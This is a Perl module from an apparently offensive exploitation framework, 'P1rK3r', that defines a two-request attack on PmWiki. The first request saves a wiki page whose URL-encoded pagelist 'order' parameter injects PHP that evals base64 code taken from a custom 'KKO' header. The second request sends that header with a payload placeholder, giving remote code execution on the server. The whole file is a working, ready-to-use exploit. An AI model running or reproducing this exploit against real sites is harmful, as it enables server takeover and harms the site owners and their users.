package P1rK3r::Exploits::PMWIKI::MSF::PmwikiPagelist;
use parent qw(P1rK3r::Exploit P1rK3r::Services::PMWIKI);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "PmwikiPagelist";

   my $DETECTION = {

   };

   my $EXPLOIT = {
        TYPE => 'MSF',
        PLATFORM => 'MULTI',
        REQUESTS => {
                EXPLOIT3 => {
                        METHOD       => 'POST',
                        PATH         => 'pmwiki.php',
                        PAYLOAD      => 'action=edit&post=save&n=KKO.NZZI&text=%28%3apagelist%20order%3d%27%5d%29%3berror_reporting%280%29%3beval%28base64_decode%28%24_SERVER%5bHTTP_KKO%5d%29%29%3bdie%3b%23%3a%29',
                        TEXT         => 'Sending Exploit #3 Request : [POST] /pmwiki.php',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'pmwiki.php',
                        PAYLOAD      => 'n=KKO.NZZI',
                        TEXT         => 'Sending Exploit #1 Request : [POST] /pmwiki.php',
                        HEADERS      => {
                           'KKO' => 'X19QQVlMT0FEX18=',
                           'Connection' => 'Close',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
